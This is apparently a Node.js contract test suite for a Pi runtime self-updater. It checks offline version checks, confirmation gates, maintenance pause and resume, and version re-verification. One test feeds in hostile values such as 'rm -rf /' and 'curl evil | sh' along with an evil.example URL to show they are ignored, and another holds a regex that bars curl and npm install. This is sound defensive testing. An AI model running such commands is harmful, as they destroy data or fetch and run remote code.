/* Pi 运行时更新（Built-in Pi Updater）契约测试。
 *
 * 完全离线：**不联网、不跑真实 pi、不碰全局 npm、不读用户真实数据**。
 * 检查用的 fetch 与 updater 用的 runner 全部是注入的替身；bridge 用假子进程。
 *
 * 用法：node tests/pi-update.cjs
 *
 * 分七段（与任务书 A–G 对应）：
 *   A. 检查（TTL / 单飞 / force / 超时 / 网络 / 离线 / 形状 / 包名 / 隐私）
 *   B. 更新动作（确认 / 过期 / no-op / 固定参数 / 任意参数无效 / 闸门 / 并发）
 *   C. maintenance（停得干净、不自动重启、resume 只启动一次、失败也 resume）
 *   D. 身份（entry 只解析一次并一路传递；解析不出来就拒绝，不 fallback）
 *   E. 缓存失效与版本复验（退出码 0 ≠ 完成）
 *   F. 静态边界（这个模块里不可能出现别的安装方式）
 */
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { EventEmitter } = require('node:events');
const { PassThrough } = require('node:stream');

let pass = 0;
let fail = 0;
function check(name, cond, extra) {
  const ok = typeof cond === 'function' ? cond() : cond;
  if (ok === true) {
    pass++;
    console.log('  ok   ' + name);
  } else {
    fail++;
    console.log('  FAIL ' + name + (ok ? '  → ' + ok : extra ? '  → ' + extra : ''));
  }
}
function section(t) {
  console.log('\n--- ' + t + ' ---');
}
const tick = () => new Promise((r) => setTimeout(r, 0));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/** 假子进程（与 tests/reliability.cjs 同一套：stdin/stdout/stderr + kill 触发 exit）。 */
function fakeChild() {
  const child = new EventEmitter();
  child.stdin = new PassThrough();
  child.stdout = new PassThrough();
  child.stderr = new PassThrough();
  child.pid = Math.floor(Math.random() * 100000) + 1;
  child.kills = 0;
  child.kill = () => {
    child.kills++;
    process.nextTick(() => child.emit('exit', 0, 'SIGTERM'));
  };
  return child;
}

(async () => {
  const mod = await import('../server/pi-update.js');
  const { createPiUpdate, isOffline, LATEST_VERSION_URL, PI_PACKAGE, PHASES } = mod;
  const { createRpcBridge } = await import('../server/rpc-bridge.js');
  const { createRuntime } = await import('../server/runtime.js');

  const okFetch = (version = '1.0.0', packageName = PI_PACKAGE) => async (url, init) => ({
    ok: true,
    status: 200,
    json: async () => ({ ok: true, version, packageName }),
    _init: init,
  });

  /**
   * 造一个 pi-update 实例 + 观察窗。所有外部依赖都是替身。
   * @param opts.clock 可控时钟（TTL 测试用）
   */
  function harness({
    current = '0.99.2',
    verification = 'unverified',
    env = {},
    fetchImpl = null,
    resolveOk = true,
    runResult = { ok: true, exitCode: 0 },
    afterUpgrade = null,
    busy = null,
    pause = { ok: true },
    currentCwd = null,
    ttlMs = 30 * 60 * 1000,
  } = {}) {
    let clock = 1_700_000_000_000;
    const state = {
      current,
      calls: [],
      runArgs: [],
      runOpts: [],
      paused: 0,
      resumed: 0,
      invalidated: 0,
      resolved: 0,
      sequence: [],
      advance: (ms) => {
        clock += ms;
      },
    };
    const entry = { kind: 'node', cmd: process.execPath, baseArgs: ['/pkg/dist/bundle/cli.js'], ok: true };
    const update = createPiUpdate({
      env,
      guiVersion: '0.17.0',
      now: () => clock,
      ttlMs,
      readVersion: (opts = {}) => {
        state.sequence.push(opts.force ? 'read:force' : 'read');
        return { value: state.current, source: 'package.json', status: 'known', verification };
      },
      resolveUpdaterTarget: () => {
        state.resolved += 1;
        return resolveOk ? { ok: true, entry } : { ok: false, code: 'no-proven-entry' };
      },
      runUpdater: async (args, opts) => {
        state.runArgs.push(args);
        state.runOpts.push(opts);
        if (afterUpgrade !== null) state.current = afterUpgrade;
        if (runResult instanceof Error) throw runResult;
        return runResult;
      },
      pauseBridge: async () => {
        state.paused += 1;
        return pause;
      },
      resumeBridge: () => {
        state.resumed += 1;
        return { ok: true };
      },
      invalidateCaches: () => {
        state.invalidated += 1;
        state.sequence.push('invalidate');
      },
      busyReason: () => busy,
      currentCwd: currentCwd ? () => currentCwd() : null,
      fetchImpl: async (url, init) => {
        state.calls.push({ url, init });
        return (fetchImpl || okFetch())(url, init);
      },
    });
    return { update, state, entry };
  }

  /* ================= A. 检查 ================= */
  section('A. 检查（只读、固定 endpoint、白名单）');

  {
    const { update, state } = harness();
    const s = await update.readStatus({});
    check('A1. 0.99.2 → 1.0.0：updateAvailable=true / canUpdate=true', () =>
      (s.ok === true && s.updateAvailable === true && s.canUpdate === true && s.latestVersion === '1.0.0') || JSON.stringify(s));
    check('A2. 带上当前版本与核对状态（前端要用它显示未验收警告）', () =>
      (s.currentVersion === '0.99.2' && s.verification === 'unverified') || JSON.stringify(s));
    check('A3. packageName 是官方包名', () => s.packageName === PI_PACKAGE || s.packageName);
    check('A4. 请求打的是固定 URL，且不带任何本机信息', () => {
      const c = state.calls[0];
      if (!c) return '没有发出请求';
      if (c.url !== LATEST_VERSION_URL) return c.url;
      if (/\?|cwd|session|model|provider|project/i.test(c.url)) return c.url;
      return true;
    });
    check('A5. 请求头只有 Accept 与 User-Agent（无 cookie / token / referer）', () => {
      const h = (state.calls[0].init && state.calls[0].init.headers) || {};
      const keys = Object.keys(h).sort();
      if (JSON.stringify(keys) !== JSON.stringify(['Accept', 'User-Agent'])) return JSON.stringify(keys);
      if (!/^pi-gui\/0\.17\.0$/.test(h['User-Agent'])) return h['User-Agent'];
      return true;
    });
    check('A6. GET、无 body、带超时信号', () => {
      const init = state.calls[0].init;
      return (init.method === 'GET' && init.body === undefined && Boolean(init.signal)) || JSON.stringify({ m: init.method, b: init.body, s: Boolean(init.signal) });
    });
    check('A7. 响应字段严格落在白名单里', () => {
      const allowed = new Set(['ok', 'phase', 'currentVersion', 'latestVersion', 'packageName', 'updateAvailable', 'verification', 'canUpdate', 'reason', 'cached', 'installedVersion', 'errorCode', 'error', 'checkedAt', 'running']);
      const extra = Object.keys(s).filter((k) => !allowed.has(k));
      return extra.length === 0 || JSON.stringify(extra);
    });
  }

  {
    const { update, state } = harness({ current: '1.0.0' });
    const s = await update.readStatus({});
    check('A8. 已是最新：updateAvailable=false / phase=latest / canUpdate=false', () =>
      (s.updateAvailable === false && s.phase === 'latest' && s.canUpdate === false && s.reason === 'latest') || JSON.stringify(s));
    check('A9. 已是最新时 canUpdate=false、reason=latest（按钮不该出现）', () =>
      (s.canUpdate === false && s.reason === 'latest') || JSON.stringify({ canUpdate: s.canUpdate, reason: s.reason }));
  }

  {
    const { update } = harness({ fetchImpl: async () => ({ ok: true, status: 200, json: async () => ({ nope: 1 }) }) });
    const s = await update.readStatus({});
    check('A10. 响应形状不认识 → invalid-response，且不冒充新版本', () =>
      (s.ok === false && s.errorCode === 'invalid-response' && s.updateAvailable !== true) || JSON.stringify(s));
  }
  {
    const { update } = harness({ fetchImpl: async () => ({ ok: true, status: 200, json: async () => ({ ok: true, version: '1.0.0', packageName: '@someone-else/pi' }) }) });
    const s = await update.readStatus({});
    check('A11. 陌生 packageName → foreign-package（绝不据此更新）', () =>
      (s.ok === false && s.errorCode === 'foreign-package') || JSON.stringify(s));
  }
  {
    const { update } = harness({ fetchImpl: async () => ({ ok: true, status: 200, json: async () => ({ ok: true, version: 'not-a-version', packageName: PI_PACKAGE }) }) });
    const s = await update.readStatus({});
    check('A12. 版本号不合法 → invalid-response', () => (s.ok === false && s.errorCode === 'invalid-response') || JSON.stringify(s));
  }
  {
    const abort = new Error('aborted');
    abort.name = 'AbortError';
    const { update } = harness({ fetchImpl: async () => { throw abort; } });
    const s = await update.readStatus({});
    check('A13. 超时 → errorCode=timeout', () => (s.ok === false && s.errorCode === 'timeout') || JSON.stringify(s));
  }
  {
    const { update } = harness({ fetchImpl: async () => { throw new Error('ENOTFOUND'); } });
    const s = await update.readStatus({});
    check('A14. 网络失败 → errorCode=network（结构化失败，不抛）', () =>
      (s.ok === false && s.errorCode === 'network') || JSON.stringify(s));
  }
  {
    const { update, state } = harness({ fetchImpl: async () => ({ ok: false, status: 503, json: async () => ({}) }) });
    const s = await update.readStatus({});
    check('A15. 非 2xx → http-error', () => (s.ok === false && s.errorCode === 'http-error') || JSON.stringify(s));
    check('A16. 失败不进缓存（下次仍会重试）', () => state.calls.length === 1 || state.calls.length);
    const s2 = await update.readStatus({});
    check('A17. 失败之后再次检查仍会真的发请求', () =>
      (state.calls.length === 2 && s2.ok === false) || JSON.stringify({ calls: state.calls.length }));
  }
  {
    const { update, state } = harness({ env: { PI_OFFLINE: '1' } });
    const s = await update.readStatus({});
    check('A18. PI_OFFLINE=1 → 完全不发请求，返回 offline', () =>
      (state.calls.length === 0 && s.ok === false && s.errorCode === 'offline') || JSON.stringify({ calls: state.calls.length, s }));
    check('A19. isOffline() 认 1/true/yes/on，不认空与 0', () =>
      (isOffline({ PI_OFFLINE: '1' }) && isOffline({ PI_OFFLINE: 'true' }) && isOffline({ PI_OFFLINE: 'YES' }) &&
        !isOffline({}) && !isOffline({ PI_OFFLINE: '0' }) && !isOffline({ PI_OFFLINE: '' })) || '判定不对');
  }
  {
    const { update, state } = harness();
    const a = await update.readStatus({});
    const b = await update.readStatus({});
    check('A20. TTL 内第二次检查走缓存（只有一次网络）', () =>
      (state.calls.length === 1 && b.cached === true && a.cached === false) || JSON.stringify({ calls: state.calls.length, a: a.cached, b: b.cached }));
    state.advance(31 * 60 * 1000);
    await update.readStatus({});
    check('A21. TTL 过期后重新检查（缓存不是永久的）', () => state.calls.length === 2 || state.calls.length);
    await update.readStatus({ force: true });
    check('A22. force=1 绕过缓存', () => state.calls.length === 3 || state.calls.length);
  }
  {
    const { update, state } = harness();
    const [a, b] = await Promise.all([update.readStatus({}), update.readStatus({})]);
    check('A23. 并发检查单飞：只打一次公网，两边都拿到结果', () =>
      (state.calls.length === 1 && a.updateAvailable === true && b.updateAvailable === true) || JSON.stringify({ calls: state.calls.length }));
  }
  {
    const { update } = harness();
    check('A24. 相位集合是前端认的那几个', () =>
      PHASES.every((p) => typeof p === 'string') && PHASES.includes('updating') && PHASES.includes('verifying') && PHASES.includes('restarting'));
  }

  /* ================= B. 更新动作 ================= */
  section('B. 更新动作（确认 / 过期 / 固定参数 / 闸门）');

  const good = () => ({ action: 'update', confirm: true, expectedCurrentVersion: '0.99.2', expectedLatestVersion: '1.0.0' });

  {
    const { update, state } = harness();
    const r = await update.runUpdate({ action: 'update' });
    check('B1. confirm !== true → 拒绝（confirm-required），不暂停也不跑 updater', () =>
      (r.ok === false && r.code === 'confirm-required' && state.paused === 0 && state.runArgs.length === 0) || JSON.stringify(r));
  }
  {
    const { update, state } = harness();
    const r = await update.runUpdate({ ...good(), action: 'delete-everything' });
    check('B2. 只认 action=update', () => (r.ok === false && r.code === 'bad-action' && state.runArgs.length === 0) || JSON.stringify(r));
  }
  {
    const { update, state } = harness();
    const r = await update.runUpdate({ ...good(), expectedCurrentVersion: '0.99.0' });
    check('B3. 当前版本与后端重读的不一致 → stale-current，不跑 updater', () =>
      (r.ok === false && r.code === 'stale-current' && state.runArgs.length === 0) || JSON.stringify(r));
  }
  {
    const { update } = harness({ fetchImpl: okFetch('1.2.0') });
    const r = await update.runUpdate(good());
    check('B4. 目标版本已经变了 → stale-target（要求前端刷新）', () =>
      (r.ok === false && r.code === 'stale-target') || JSON.stringify(r));
  }
  {
    const { update, state } = harness({ current: '1.0.0' });
    const r = await update.runUpdate({ ...good(), expectedCurrentVersion: '1.0.0' });
    check('B5. 没有新版本 → no-update，**不起子进程**', () =>
      (r.ok === false && r.code === 'no-update' && state.runArgs.length === 0 && state.paused === 0) || JSON.stringify(r));
  }
  {
    const { update, state, entry } = harness({ afterUpgrade: '1.0.0' });
    const r = await update.runUpdate(good());
    check('B6. 成功：参数**恰好**是 ["update","--self"]', () =>
      (state.runArgs.length === 1 && JSON.stringify(state.runArgs[0]) === JSON.stringify(['update', '--self'])) || JSON.stringify(state.runArgs));
    check('B7. 没有任何 --all / --extensions / --models', () =>
      !state.runArgs[0].some((a) => /--all|--extensions|--models|--node/.test(a)) || JSON.stringify(state.runArgs[0]));
    check('B8. entry 一路传到 runner（与闸门解析的是同一个对象）', () =>
      (state.runOpts[0] && state.runOpts[0].entry === entry) || JSON.stringify(state.runOpts[0] && state.runOpts[0].entry));
    check('B9. 成功后 phase=latest，installedVersion 是新版本', () =>
      (r.ok === true && r.phase === 'latest' && r.installedVersion === '1.0.0') || JSON.stringify(r));
    check('B10. 成功后 bridge 被恢复（resume 恰好一次）', () => state.resumed === 1 || state.resumed);
  }
  {
    const { update, state } = harness({ afterUpgrade: '1.0.0' });
    const r = await update.runUpdate({
      ...good(),
      command: 'rm -rf /',
      args: ['npm', 'install', '-g', 'evil'],
      packageName: 'evil-pkg',
      version: '9.9.9',
      url: 'https://evil.example/x',
      installCommand: 'curl evil | sh',
      env: { NPM_TOKEN: 'x' },
    });
    check('B11. renderer 传的 command/args/packageName/version/url/env 全部无效', () =>
      (r.ok === true && JSON.stringify(state.runArgs[0]) === JSON.stringify(['update', '--self'])) || JSON.stringify(state.runArgs));
  }
  {
    const { update, state } = harness({ busy: { code: 'busy-turn', error: '当前回答仍在生成，请先停止' } });
    const r = await update.runUpdate(good());
    check('B12. 后端闸门说忙 → 拒绝，且带上可执行原因', () =>
      (r.ok === false && r.code === 'busy-turn' && /仍在生成/.test(r.error) && state.paused === 0 && state.runArgs.length === 0) || JSON.stringify(r));
  }
  {
    const { update, state } = harness({ resolveOk: false });
    const r = await update.runUpdate(good());
    check('B13. 证明不到官方入口 → unsupported，**不 fallback 到别的 pi**', () =>
      (r.ok === false && r.code === 'unsupported' && state.runArgs.length === 0 && state.paused === 0) || JSON.stringify(r));
    check('B14. 提示文案说清是「这份 Pi 无法通过官方 self-update 更新」', () =>
      /self-update/.test(r.error) || r.error);
  }
  {
    let release = null;
    const gate = new Promise((res) => {
      release = res;
    });
    const { update, state } = harness({ afterUpgrade: '1.0.0' });
    /* 让第一次更新卡在 pause 里，制造并发窗口 */
    state.slow = true;
    const first = update.runUpdate(good());
    const second = await update.runUpdate(good());
    check('B15. 并发更新被拒绝（update-running）', () =>
      (second.ok === false && second.code === 'update-running') || JSON.stringify(second));
    await first;
    release();
  }
  {
    let cwd = 'C:\\a';
    const { update } = harness({ currentCwd: () => cwd });
    const r = await update.runUpdate({ ...good(), __expectedCwd: 'C:\\a' });
    check('B16. 工作区没变 → 放行（走到 updater 之前的所有闸门都过）', () => r.ok === false ? /verify|update/.test(r.code) || JSON.stringify(r) : true);
    cwd = 'C:\\b';
    const r2 = await update.runUpdate({ ...good(), __expectedCwd: 'C:\\a' });
    check('B17. 工作区切走了 → workspace-stale', () => (r2.ok === false && r2.code === 'workspace-stale') || JSON.stringify(r2));
  }
  {
    const { update, state } = harness({ pause: { ok: false, code: 'boom' } });
    const r = await update.runUpdate(good());
    check('B18. 暂停失败 → pause-failed，不跑 updater，也不 resume（那不是我们停的）', () =>
      (r.ok === false && r.code === 'pause-failed' && state.runArgs.length === 0 && state.resumed === 0) || JSON.stringify(r));
  }
  {
    const { update, state } = harness({ pause: { ok: false, code: 'already-in-maintenance' } });
    const r = await update.runUpdate(good());
    check('B19. 已经在维护中 → update-running（不嵌套）', () =>
      (r.ok === false && r.code === 'update-running' && state.runArgs.length === 0) || JSON.stringify(r));
  }

  /* ================= C. maintenance（真 bridge） ================= */
  section('C. maintenance：停得干净、不自动重启、resume 只启动一次');

  {
    const children = [];
    const events = [];
    const runtime = createRuntime({ initialCwd: process.cwd() });
    const bridge = createRpcBridge({
      runtime,
      publish: (e) => events.push(e),
      piBin: 'fake-pi',
      isWin: false,
      env: {},
      spawnProcess: () => {
        const c = fakeChild();
        children.push(c);
        return c;
      },
      restartDelayMs: 0,
    });
    bridge.start();
    children[0].emit('spawn');
    const pending = bridge.request({ type: 'get_commands' }, { timeoutMs: 5000 });

    const pausedPromise = bridge.pauseForMaintenance('pi-update');
    check('C1. 暂停时立刻发 maintenance/pausing', () =>
      events.some((e) => e.type === 'bridge_status' && e.state === 'maintenance' && e.phase === 'pausing') || JSON.stringify(events.slice(-2)));
    const settledPending = await pending;
    check('C2. 挂起请求被安全 settle（不会干等到超时）', () => settledPending === null || JSON.stringify(settledPending));
    check('C3. 当前 child 被要求退出（stdin.end + kill）', () => children[0].kills === 1 || children[0].kills);
    const paused = await pausedPromise;
    check('C4. pauseForMaintenance 等进程真的退出才 resolve', () =>
      (paused.ok === true && paused.stopped === true) || JSON.stringify(paused));
    check('C5. 退出后发 maintenance/stopped，且**没有**自动重启', () =>
      (events.some((e) => e.type === 'bridge_status' && e.state === 'maintenance' && e.phase === 'stopped') &&
        !events.some((e) => e.type === 'bridge_status' && e.state === 'starting' && events.indexOf(e) > 0)) ||
      JSON.stringify(events.filter((e) => e.type === 'bridge_status').map((e) => e.state + ':' + (e.phase || ''))));

    await sleep(30);
    check('C6. 维护期间不会拉起新 child（等一个 backoff 窗口也不动）', () => children.length === 1 || children.length);
    check('C7. 维护期间 send() 被拒绝（不再接受新命令）', () => {
      try {
        bridge.send({ type: 'prompt', message: 'hi' });
        return '居然发出去了';
      } catch (err) {
        return /更新|维护/.test(err.message) || err.message;
      }
    });
    const duringRequest = await bridge.request({ type: 'get_commands' }, { timeoutMs: 200 });
    check('C8. 维护期间 request() 直接回 null', () => duringRequest === null || JSON.stringify(duringRequest));
    const again = await bridge.pauseForMaintenance('pi-update');
    check('C9. 重复 pause → already-in-maintenance（防嵌套）', () =>
      (again.ok === false && again.code === 'already-in-maintenance') || JSON.stringify(again));
    check('C10. 维护态能从 getState() 读出来（刷新页面后前端才显示得对）', () =>
      Boolean(bridge.getState().maintenance && bridge.getState().maintenance.reason === 'pi-update') || JSON.stringify(bridge.getState().maintenance));

    const resumed = bridge.resumeFromMaintenance();
    check('C11. resume 之后正好启动一个新 child', () => (resumed.ok === true && children.length === 2) || JSON.stringify({ r: resumed, n: children.length }));
    check('C12. resume 只发一次 starting', () =>
      events.filter((e) => e.type === 'bridge_status' && e.state === 'starting').length === 2 ||
      events.filter((e) => e.type === 'bridge_status' && e.state === 'starting').length);
    check('C13. 再 resume → not-paused（不会顺手再拉起一个 pi）', () => {
      const r2 = bridge.resumeFromMaintenance();
      return (r2.ok === false && r2.code === 'not-paused' && children.length === 2) || JSON.stringify({ r2, n: children.length });
    });
    check('C14. resume 之后命令重新可用（child 活着）', () => {
      children[1].emit('spawn');
      bridge.send({ type: 'get_state' });
      return true;
    });
    /* 维护不应该污染崩溃退避：维护结束后再来一次「意外退出」，仍按正常崩溃路径重启 */
    const before = events.length;
    children[1].emit('exit', 1, null);
    await sleep(30);
    check('C15. 维护之后的意外退出仍走正常重启（crashStreak 没被维护搞脏）', () =>
      (children.length === 3 && events.slice(before).some((e) => e.state === 'exited')) ||
      JSON.stringify({ n: children.length, tail: events.slice(before).map((e) => e.state) }));
    runtime.setShuttingDown(true);
    bridge.stop();
  }

  /* ================= D. 身份 ================= */
  section('D. 身份：只解析一次、不 fallback');

  {
    const { update, state, entry } = harness({ afterUpgrade: '1.0.0' });
    await update.runUpdate(good());
    check('D1. 解析入口最多两次（一次给 canUpdate 显示、一次给更新），执行时用闸门那次', () =>
      state.resolved <= 2 || state.resolved);
    check('D2. runner 收到的是同一个 entry 对象（不是重新找的一份）', () =>
      state.runOpts[0].entry === entry || 'entry 不一致');
  }
  {
    const src = fs.readFileSync(path.join(__dirname, '..', 'server', 'pi-update.js'), 'utf8')
      .replace(/\/\*[\s\S]*?\*\//g, '')
      .replace(/^\s*\/\/.*$/gm, '');
    check('D3. 模块自己不起进程（没有 child_process / spawn / exec）', () =>
      !/child_process|spawn\(|execFile|execSync/.test(src) || '出现了进程启动代码');
    check('D4. 模块里没有别的安装方式（npm/pnpm/bun/curl/--all）', () =>
      !/(^|[^a-z])(npm|pnpm|bun|yarn)\s+(install|add|i)\b|curl\s|--all\b|--extensions\b|--models\b/.test(src) || '出现了别的安装路径');
  }
  {
    const serverSrc = fs.readFileSync(path.join(__dirname, '..', 'server.js'), 'utf8');
    check('D5. server 装配里 updater 目标来自 launch identity（buildPiEntry(piLaunch.packageDir())）', () =>
      /resolveUpdaterTarget[\s\S]{0,400}buildPiEntry\(piLaunch\.packageDir\(\)\)/.test(serverSrc) ||
      '没有从 launch identity 派生 updater 目标');
    check('D6. 没有「PATH 再找一份 pi」的 fallback 分支（modify 里没有 bin="pi"）', () =>
      !/resolveUpdaterTarget[\s\S]{0,600}['"]pi['"]/.test(serverSrc) || '看起来有 fallback 到裸 pi 的路径');
  }

  /* ================= E. 缓存失效与版本复验 ================= */
  section('E. 缓存失效与版本复验');

  {
    const { update, state } = harness({ afterUpgrade: '1.0.0' });
    await update.runUpdate(good());
    const iInvalidate = state.sequence.indexOf('invalidate');
    const iForceRead = state.sequence.findIndex((s) => s === 'read:force');
    check('E1. 成功路径：先清 identity-bound 缓存，再**强制**重读版本', () =>
      (state.invalidated === 1 && iInvalidate >= 0 && iForceRead > iInvalidate) || JSON.stringify(state.sequence));
    const afterCheck = await update.readStatus({});
    check('E2. 成功之后检查缓存作废（版本已经变了）', () => afterCheck.cached === false || '还命中旧缓存');
  }
  {
    const { update, state } = harness({ afterUpgrade: null });
    const r = await update.runUpdate(good());
    check('E3. updater 退出码 0 但版本没变 → verify-failed（不能说更新成功）', () =>
      (r.ok === false && r.code === 'verify-failed' && r.installedVersion === '0.99.2') || JSON.stringify(r));
    check('E4. 复验失败也必须恢复 bridge（否则永久停在维护态）', () => state.resumed === 1 || state.resumed);
    check('E5. 复验失败时 phase 是 failed', () => update.snapshot().phase === 'failed' || update.snapshot().phase);
  }
  {
    const { update, state } = harness({ runResult: { ok: false, exitCode: 1, stderr: 'npm ERR! code EACCES\n路径 C:\\Users\\someone\\.npmrc 不可写\nTOKEN=abc' } });
    const r = await update.runUpdate(good());
    check('E6. updater 非 0 → update-failed，且恢复 bridge', () =>
      (r.ok === false && r.code === 'update-failed' && state.resumed === 1) || JSON.stringify(r));
    check('E7. 错误文本脱敏（没有绝对路径、没有 token 原值）', () =>
      (!/[A-Za-z]:\\/.test(r.error) && !/TOKEN=abc/.test(r.error)) || r.error);
    check('E8. 只回一句话摘要，不回原始 stderr', () =>
      (typeof r.error === 'string' && r.error.length <= 240 && !/\n/.test(r.error)) || r.error);
  }
  {
    const { update, state } = harness({ runResult: { ok: false, timedOut: true } });
    const r = await update.runUpdate(good());
    check('E9. updater 超时 → update-timeout，且恢复 bridge', () =>
      (r.ok === false && r.code === 'update-timeout' && state.resumed === 1) || JSON.stringify(r));
  }
  {
    const { update, state } = harness({ runResult: new Error('spawn EPERM') });
    const r = await update.runUpdate(good());
    check('E10. runner 抛错 → update-spawn-failed / update-failed，且恢复 bridge', () =>
      (r.ok === false && state.resumed === 1 && ['update-spawn-failed', 'update-failed'].includes(r.code)) || JSON.stringify(r));
  }
  {
    const { update, state } = harness({ afterUpgrade: '1.0.0', verification: 'verified' });
    await update.runUpdate(good());
    const snap = update.snapshot();
    check('E11. 快照（诊断用）只含公开字段、不发请求', () => {
      const allowed = new Set(['phase', 'currentVersion', 'latestVersion', 'updateAvailable', 'verification', 'canUpdate', 'reason', 'running', 'cached', 'errorCode']);
      const extra = Object.keys(snap).filter((k) => !allowed.has(k));
      return (extra.length === 0 && snap.running === false) || JSON.stringify(extra);
    });
    check('E12. reset() 之后回到 idle（不残留上一次结论）', () => {
      update.reset();
      return update.snapshot().phase === 'idle' || update.snapshot().phase;
    });
  }

  /* ================= F. HTTP 层（handle） ================= */
  section('F. HTTP 层：方法 / 错误码 / 202 语义');

  {
    const { update } = harness({ afterUpgrade: '1.0.0' });
    const res = { code: 0, body: null };
    const fakeRes = {
      writeHead: (c) => {
        res.code = c;
        return fakeRes;
      },
      end: (b) => {
        res.body = b;
      },
    };
    const json = (r, code, body) => {
      r.writeHead(code);
      r.end(JSON.stringify(body));
    };
    await update.handle({ method: 'PUT', on: () => {}, headers: {} }, fakeRes, new URL('http://x/api/pi-update'), json);
    check('F1. 非 GET/POST → 405 JSON', () => (res.code === 405 && /method-not-allowed/.test(res.body)) || JSON.stringify(res));

    const req = new EventEmitter();
    req.method = 'POST';
    req.headers = {};
    const p = update.handle(req, fakeRes, new URL('http://x/api/pi-update'), json);
    await tick();
    req.emit('data', Buffer.from('{ not json'));
    req.emit('end');
    await p;
    check('F2. 请求体不是 JSON → 400 bad-body', () => (res.code === 400 && /bad-body/.test(res.body)) || JSON.stringify(res));

    const req2 = new EventEmitter();
    req2.method = 'POST';
    req2.headers = {};
    const p2 = update.handle(req2, fakeRes, new URL('http://x/api/pi-update'), json);
    await tick();
    req2.emit('data', Buffer.from(JSON.stringify(good())));
    req2.emit('end');
    await p2;
    check('F3. 合法 POST → 202 accepted + phase=updating（前端据此开始轮询）', () =>
      (res.code === 202 && /"accepted":true/.test(res.body) && /"phase":"updating"/.test(res.body)) || JSON.stringify({ code: res.code, body: res.body }));
    await sleep(20);
    check('F4. 后台跑完后快照变成 latest', () => update.snapshot().phase === 'latest' || update.snapshot().phase);
  }
  {
    const { update } = harness({ env: { PI_OFFLINE: '1' } });
    const res = { code: 0, body: null };
    const json = (r, code, body) => {
      res.code = code;
      res.body = JSON.stringify(body);
    };
    await update.handle({ method: 'GET', headers: {} }, {}, new URL('http://x/api/pi-update'), json);
    check('F5. GET 离线 → 200 + ok:false/offline（业务结果不用 5xx）', () =>
      (res.code === 200 && /"errorCode":"offline"/.test(res.body)) || JSON.stringify(res));
  }

  console.log('');
  console.log(`${pass}/${pass + fail} 通过`);
  process.exitCode = fail ? 1 : 0;
})().catch((err) => {
  console.error(err);
  process.exit(1);
});
